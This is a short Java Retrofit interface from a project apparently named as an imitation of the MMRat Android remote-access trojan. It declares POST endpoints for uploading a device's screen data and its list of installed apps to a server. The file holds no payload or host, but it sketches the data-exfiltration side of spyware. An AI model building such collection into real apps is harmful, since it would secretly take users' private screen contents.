package com.example.mmrat_wannabe.retrofit;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.POST;


public interface ApiService {
    @POST("/screen/")
    Call<String> uploadScreenData(@Body String data);

    @POST("/installed_app/")
    Call<String> uploadInstalledApp(@Body String data);
}
